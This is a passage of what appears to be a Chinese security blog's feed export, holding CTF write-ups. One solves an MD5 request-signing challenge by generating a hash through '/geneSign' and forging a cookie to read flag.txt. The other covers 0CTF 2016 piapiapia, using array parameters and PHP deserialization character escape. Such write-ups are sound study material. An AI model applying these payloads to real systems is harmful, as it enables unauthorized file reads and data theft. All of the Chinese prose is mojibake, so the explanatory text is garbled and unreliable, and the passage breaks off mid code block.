class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span><span class="comment">#å°†ä¼ å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œmd5åŠ å¯†</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span><span class="comment">#é˜²ç«å¢™çš„ä½œç”¨æ˜¯åˆ¤æ–­å¼€å¤´çš„å‡ ä¸ªå­—æ¯æ˜¯å¦æ˜¯gopher æˆ–è€…æ˜¯file  å¦‚æœæ˜¯çš„è¯ï¼Œè¿”å›true</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">9999</span>)</span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼š</p><h5 id="1-flaskæ¡†æ¶"><a href="#1-flaskæ¡†æ¶" class="headerlink" title="1.flaskæ¡†æ¶"></a>1.flaskæ¡†æ¶</h5><h5 id="2-De1taå’Œ-geneSign"><a href="#2-De1taå’Œ-geneSign" class="headerlink" title="2./De1taå’Œ/geneSign"></a>2./De1taå’Œ/geneSign</h5><h5 id="3-taskç±»"><a href="#3-taskç±»" class="headerlink" title="3.taskç±»"></a>3.taskç±»</h5><p>å¾—åˆ°flagçš„å¤§è‡´æ€è·¯æœ‰äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é¦–å…ˆç»•è¿‡self.checkSign()ï¼Œå¹¶ä¸”ä¼ å…¥çš„actionéœ€è¦åŒæ—¶åŒ…å«scanå’Œreadï¼Œç„¶åif &quot;scan&quot; in self.action:æ‰§è¡Œå°†flag.txtä¸­çš„æ•°æ®å†™å…¥result.txtä¸­ï¼Œç»§ç»­if &quot;read&quot; in self.action:æ‰§è¡Œè¯»å–result.txtä¸­çš„æ•°æ®ï¼Œå¹¶ä¸”æ”¾åœ¨ result[&#39;data&#39;] ä¸­ ï¼Œ return json.dumps(task.Exec())   æ¥ç€è¿”å›ä»¥jsonçš„å½¢å¼è¿”å›åˆ°å®¢æˆ·ç«¯ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">def getSign(action, param):#getSignçš„ä½œç”¨æ˜¯æ‹¼æ¥secret_key,param,actionï¼Œç„¶åè¿”å›æ‹¼æ¥åçš„å­—ç¬¦ä¸²çš„md5åŠ å¯†å€¼</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>éœ€è¦æ»¡è¶³å‡½æ•°</p><p>self.checkSign()</p><p>åˆ™éœ€æ»¡è¶³</p><p><strong>getSign(self.action, self.param) == self.signï¼Œï¼ˆè€Œsignå€¼é€šè¿‡cookieä¼ å€¼</strong>ï¼‰</p><p>ä¹Ÿå°±éœ€è¦</p><p><strong>hashlib.md5(secert_key + param + action).hexdigest() == self.sign</strong></p><p>=&gt;<strong>hashlib.md5(secert_key + â€˜flag.txtâ€™ + â€˜readscanâ€™).hexdigest() == self.sign</strong></p><p>æˆ‘ä»¬éœ€è¦å¾—åˆ°**secert_key + â€˜flag.txtreadscanâ€™**çš„å“ˆå¸Œå€¼</p><p>æˆ‘ä»¬è¿˜ä¸æ‡‚secret_keyçš„å€¼æ˜¯å¤šå°‘ï¼Œå®ƒåªå­˜åœ¨äºæœåŠ¡ç«¯ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šé¢æˆªå–çš„æºç ä¸­/geneSignï¼Œæ¥è¿”å›æˆ‘ä»¬æ‰€éœ€è¦çš„ç¼–ç ä¹‹åçš„å“ˆå¸Œå€¼</p><p>æ³¨æ„åˆ°/geneSignä¸­å·²ç»å°†actionå®šä¸ºscanï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å…¥çš„paramå¯ä»¥ä¸ºflag.txtreadï¼Œè¿™æ ·çš„è¯è¿˜æ˜¯ä¼šæ‹¼æ¥ä¸ºsecert_key + â€˜flag.txtreadscanâ€™</p><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;geneSign?param&#x3D;flag.txtread</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/buu/13/image-20210818205021931.png" alt="image-20210818205021931"></p><p>å¾—åˆ°å“ˆå¸Œå€¼åï¼Œå°†flag.txtä¸­çš„æ•°æ®è¯»å…¥result.txtï¼Œç„¶åè¯»å–result.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">              tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)   <span class="comment">#æ³¨æ„wï¼Œå¯ä»¥å¯¹result.txtæ–‡ä»¶è¿›è¡Œä¿®æ”¹</span></span><br><span class="line">              resp = scan(self.param)</span><br><span class="line">              <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                  result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                  <span class="keyword">print</span> resp</span><br><span class="line">                  tmpfile.write(resp)<span class="comment">#è¿™ä¸ªå°†respä¸­çš„æ•°æ®å†™å…¥result.txtä¸­ï¼Œå¯ä»¥åˆ©ç”¨ä¸ºå°†flag.txtä¸­çš„æ•°æ®æ”¾è¿›result.txtä¸­</span></span><br><span class="line">                  tmpfile.close()</span><br><span class="line">              result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">          <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">              f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)<span class="comment">#æ‰“å¼€æ–¹å¼ä¸ºåªè¯»</span></span><br><span class="line">              result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">              result[<span class="string">&#x27;data&#x27;</span>] = f.read()<span class="comment">#è¯»å–result.txtä¸­çš„æ•°æ®</span></span><br><span class="line">          <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">              result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br></pre></td></tr></table></figure><h5 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h5><p>ä¼ªé€ cookieçš„å€¼</p><p><img src="/2021/08/18/buu/13/image-20210818205732109.png" alt="image-20210818205732109"></p><h5 id="å‚è€ƒåšå®¢ï¼š"><a href="#å‚è€ƒåšå®¢ï¼š" class="headerlink" title="å‚è€ƒåšå®¢ï¼š"></a>å‚è€ƒåšå®¢ï¼š</h5><p><a href="https://blog.csdn.net/RABCDXB/article/details/115412359">https://blog.csdn.net/RABCDXB/article/details/115412359</a></p><p><a href="https://www.cnblogs.com/zzjdbk/p/13685940.html">https://www.cnblogs.com/zzjdbk/p/13685940.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0CTF 2016 piapiapia</title>
      <link href="/2021/08/17/buu/12/"/>
      <url>/2021/08/17/buu/12/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00çŸ¥è¯†ç‚¹"><a href="#0x00çŸ¥è¯†ç‚¹" class="headerlink" title="0x00çŸ¥è¯†ç‚¹"></a>0x00çŸ¥è¯†ç‚¹</h4><ul><li><h5 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h5></li><li><h5 id="å‚æ•°ä¼ é€’æ•°ç»„ç»•è¿‡å­—ç¬¦ä¸²æ£€æµ‹"><a href="#å‚æ•°ä¼ é€’æ•°ç»„ç»•è¿‡å­—ç¬¦ä¸²æ£€æµ‹" class="headerlink" title="å‚æ•°ä¼ é€’æ•°ç»„ç»•è¿‡å­—ç¬¦ä¸²æ£€æµ‹"></a>å‚æ•°ä¼ é€’æ•°ç»„ç»•è¿‡å­—ç¬¦ä¸²æ£€æµ‹</h5></li><li><h5 id="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h5><h5 id="å‚è€ƒåšå®¢"><a href="#å‚è€ƒåšå®¢" class="headerlink" title="å‚è€ƒåšå®¢"></a>å‚è€ƒåšå®¢</h5><p><a href="https://www.cnblogs.com/g0udan/p/12216207.html">0CTF 2016]piapiapiaè§£é¢˜è¯¦ç»†æ€è·¯åŠå¤ç° - g0udan - åšå®¢å›­ (cnblogs.com)</a></p></li></ul><h4 id="0x01è§£é¢˜"><a href="#0x01è§£é¢˜" class="headerlink" title="0x01è§£é¢˜"></a>0x01è§£é¢˜<img src="/2021/08/17/buu/12/image-20210817200805927.png" alt="image-20210817200805927"></h4><p>è¿›æ¥æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œå¾ˆéš¾ç™»å½•ï¼Œä¸”ä¹Ÿä¸æ˜¯ä»€ä¹ˆsqlæ³¨å…¥</p><p>f12æ— å‘ç°</p><p>è¿™æ—¶å€™è¯·å‡ºdirsearch(è®°å¾—è°ƒä½çº¿ç¨‹ï¼Œä¸ç„¶ä¼šæ¼æ‰<a href="http://www.zip/">www.zip</a>)</p><p><img src="/2021/08/17/buu/12/image-20210817201129087.png" alt="image-20210817201129087"></p><p>é€šè¿‡åå°æ‰«ææˆ‘ä»¬æœ‰äº†registeré¡µé¢ï¼Œä¹Ÿå°±æ˜¯æ³¨å†Œé¡µé¢</p><p>è¿˜æœ‰<a href="http://www.zip,config.php,update.php,è¿™äº›æˆ‘ä»¬åé¢éƒ½è¦ç”¨åˆ°./">www.zip,config.php,update.php,è¿™äº›æˆ‘ä»¬åé¢éƒ½è¦ç”¨åˆ°ã€‚</a></p><p><img src="/2021/08/17/buu/12/image-20210817204317100.png" alt="image-20210817204317100"></p><p>æ³¨å†Œåç™»å½•</p><p><img src="/2021/08/17/buu/12/image-20210817201432160.png" alt="image-20210817201432160"></p><p><img src="/2021/08/17/buu/12/image-20210817201501824.png" alt="image-20210817201501824"></p><p>è¿›å…¥åˆ°updat.php,æç¤ºæˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ï¼Œæœ¬æ¥æˆ‘è¿˜ä»¥ä¸ºæ˜¯ä¼ å›¾ç‰‡é©¬</p><p>ç»“æœæœ¬é¢˜æ ¸å¿ƒä¸æ˜¯ï¼Œæ˜¯å‰é¢æ‰«å‡ºçš„<a href="http://www.zipæºç æç¤ºäº†ç»•è¿‡/">www.zipæºç æç¤ºäº†ç»•è¿‡</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line">require_once(&#39;class.php&#39;);</span><br><span class="line">if ($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;</span><br><span class="line">die(&#39;Login First&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if ($_POST[&#39;phone&#39;] &amp; &amp; $_POST[&#39;email&#39;] &amp; &amp; $_POST[&#39;nickname&#39;] &amp; &amp; $_FILES[&#39;photo&#39;]) &#123;</span><br><span class="line"></span><br><span class="line">$username &#x3D; $_SESSION[&#39;username&#39;];</span><br><span class="line">if (!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))</span><br><span class="line">die(&#39;Invalid phone&#39;);</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))</span><br><span class="line">die(&#39;Invalid email&#39;);</span><br><span class="line"></span><br><span class="line">if (preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) | | strlen($_POST[&#39;nickname&#39;]) &gt; 10)</span><br><span class="line">die(&#39;Invalid nickname&#39;);</span><br><span class="line"></span><br><span class="line">$file &#x3D; $_FILES[&#39;photo&#39;];</span><br><span class="line">if ($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)</span><br><span class="line">die(&#39;Photo size error&#39;);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39;.md5($file[&#39;name&#39;]));</span><br><span class="line">$profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];</span><br><span class="line">$profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];</span><br><span class="line">$profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;];</span><br><span class="line">$profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39;.md5($file[&#39;name&#39;]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure><p>ä»£ç åˆ†æï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require_once(&#39;class.php&#39;);</span><br><span class="line">if ($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;</span><br><span class="line">die(&#39;Login First&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å·²ç»ç™»å½•äº†ï¼Œéå¸¸å®¹æ˜“åœ°å°±æ»¡è¶³äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($_POST[&#39;phone&#39;] &amp; &amp; $_POST[&#39;email&#39;] &amp; &amp; $_POST[&#39;nickname&#39;] &amp; &amp; $_FILES[&#39;photo&#39;]) &#123;</span><br></pre></td></tr></table></figure><p>å‡ ä¸ªå˜é‡å€¼éƒ½ä¸ºPOSTä¼ å‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))</span><br><span class="line">die(&#39;Invalid phone&#39;);</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼åˆ¤æ–­æ˜¯å¦ä¸º11ä½çš„æ•°å­—ç”µè¯å·ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) | | strlen($_POST[&#39;nickname&#39;]) &gt; 10)</span><br><span class="line">die(&#39;Invalid nickname&#39;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ¤æ–­äº†nicknameæ˜¯å¦ä¸ºå­—ç¬¦è¿˜æœ‰é•¿åº¦æ˜¯å¦è¶…è¿‡10</p><p>ç”¨æ–‡ç« å¼€å¤´çš„çŸ¥è¯†ç‚¹äºŒï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥çš„nicknameæ˜¯ä¸€ä¸ªæ•°ç»„</p><p>ç»•è¿‡é•¿åº¦çš„é™åˆ¶ï¼Œåˆ™å¯ä»¥ç»•è¿‡è¿™æ­£åˆ™è¡¨è¾¾å¼ï¼Œä½¿å¾—æˆ‘ä»¬ä¸ä¼šdieå‡ºã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br></pre></td></tr></table></figure><h5 id="ç…§æ¬å¤§ä½¬æ€è·¯ï¼š"><a href="#ç…§æ¬å¤§ä½¬æ€è·¯ï¼š" class="headerlink" title="â€ƒç…§æ¬å¤§ä½¬æ€è·¯ï¼š"></a>â€ƒç…§æ¬å¤§ä½¬æ€è·¯ï¼š</h5><p>åœ¨ä»£ç çš„åé¢è°ƒç”¨update_profileå¤„æˆ‘ä»¬æƒ³åˆ°è¿™ä¸ªå¯èƒ½æ˜¯å°†æ•°æ®ä¿å­˜åˆ°æ•°æ®åº“ï¼Œè€Œä¸”è¿˜ç”¨äº†phpåºåˆ—åŒ–serialize()ï¼Œæˆ‘ä»¬å¯ä»¥å¤§èƒ†çš„å°è¯•ç”¨ååºåˆ—åŒ–æ¼æ´æ¥æä¸€ä¸‹ã€‚</p><p>â€ƒæˆ‘ä»¬å†çœ‹çœ‹update_profile()åˆ°åº•æ˜¯ä¸ªå•¥ï¼Œä½¿ç”¨å…¨å±€æœç´¢æˆ‘ä»¬åœ¨class.phpä¸­çœ‹åˆ°äº†å®šä¹‰çš„update_profile()æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function update_profile($username, $new_profile) &#123;</span><br><span class="line">$username &#x3D; parent::filter($username);</span><br><span class="line">$new_profile &#x3D; parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;</span><br><span class="line">return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€ƒâ€ƒæˆ‘ä»¬å†ç»§ç»­è¿½å¯»ä¸‹å»<br>filter()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);</span><br><span class="line">$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;</span><br><span class="line">$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);</span><br><span class="line"></span><br><span class="line">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);</span><br><span class="line">$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;</span><br><span class="line">return preg_replace($safe, &#39;hacker&#39;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>update()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function update($table, $key, $value, $where) &#123;</span><br><span class="line">$sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;;</span><br><span class="line">return mysql_query($sql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€ƒâ€ƒupdate.phpæˆ‘ä»¬åŸºæœ¬ä¸Šå°±ææ¸…æ¥šäº†ï¼Œæ˜¯å…ˆç»è¿‡æ­£åˆ™è¡¨è¾¾å¼å°†ç”¨æˆ·æäº¤çš„å‚æ•°å€¼è¿‡æ»¤ï¼Œç„¶ååºåˆ—åŒ–ï¼Œç„¶åå°†éæ³•çš„å€¼æ›¿æ¢ä¸ºâ€™hackerâ€™</p><h5 id="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çŸ¥è¯†è¡¥å……"><a href="#ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çŸ¥è¯†è¡¥å……" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çŸ¥è¯†è¡¥å……"></a>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çŸ¥è¯†è¡¥å……</h5><ul><li>PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸<br>ä¸¾ä¸ªå°ä¾‹å­<br>åºåˆ—åŒ–</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(49) &quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot; </span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">&#x2F;&#x2F;var_dump(serialize($a));</span><br><span class="line">&#x2F;&#x2F;&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br><span class="line">$b &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123; [0]&#x3D;&gt; string(3) &quot;123&quot; [1]&#x3D;&gt; string(3) &quot;abc&quot; [2]&#x3D;&gt; string(4) &quot;defg&quot; &#125; </span><br></pre></td></tr></table></figure><p>â€ƒâ€ƒæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨åç«¯ä¸­ï¼Œååºåˆ—åŒ–æ˜¯ä¸€â€;}ç»“æŸçš„ï¼Œå¦‚æœæˆ‘ä»¬æŠŠâ€;}å¸¦å…¥éœ€è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­ï¼ˆé™¤äº†ç»“å°¾å¤„ï¼‰ï¼Œæ˜¯ä¸æ˜¯å°±èƒ½è®©ååºåˆ—åŒ–æå‰ç»“æŸåé¢çš„å†…å®¹å°±ä¸¢å¼ƒäº†å‘¢ï¼Ÿ<br>â€ƒâ€ƒæˆ‘ä»¬æŠŠç¬¬äºŒä¸ªå€¼abcæ¢æˆabcâ€;i:2;s:5:â€qwertâ€;}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">&#x2F;&#x2F;var_dump(serialize($a));</span><br><span class="line">&#x2F;&#x2F;&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br><span class="line">$b &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123; [0]&#x3D;&gt; string(3) &quot;123&quot; [1]&#x3D;&gt; string(3) &quot;abc&quot; [2]&#x3D;&gt; string(5) &quot;qwert&quot; &#125; </span><br></pre></td></tr></table></figure><p>æˆåŠŸçš„ååºåˆ—åŒ–å‡ºæˆ‘ä»¬è‡ªå·±å®šä¹‰çš„å†…å®¹ï¼Œä¸¢å¼ƒäº†åŸå…ˆçš„å†…å®¹ï¼ˆi:2;s:4:â€defgâ€ï¼‰<br>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸å°±å…ˆä»‹ç»åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å›è¿‡å¤´æ¥çœ‹ä¸€ä¸‹é¢˜</p><ul><li>çªç ´å£<br>æˆ‘ä»¬å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œé¦–å…ˆåºåˆ—åŒ–çš„å­—ç¬¦æ˜¯å¯æ§çš„ï¼Œè¿˜æœ‰å‰é¢çš„é•¿åº¦æ˜¯å¯æ§çš„ã€‚ä½†update.phpå°†å‚æ•°åºåˆ—åŒ–ï¼Œæˆ‘ä»¬å¯æ§å˜é‡çš„é•¿åº¦å°±å·²ç»å†™æ­»äº†ï¼Œæ€ä¹ˆæ‰èƒ½å»æ§åˆ¶å‘¢ã€‚è¿™é“é¢˜çš„çªç ´å£å…¶å®å°±æ˜¯åºåˆ—åŒ–è¿‡åæ•°æ®è¿‡æ»¤æ›¿æ¢é‚£é‡Œï¼Œçœ‹ä¼¼æ›´åŠ å®‰å…¨ï¼Œå…¶å®æ›´åŠ å±é™©ã€‚</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 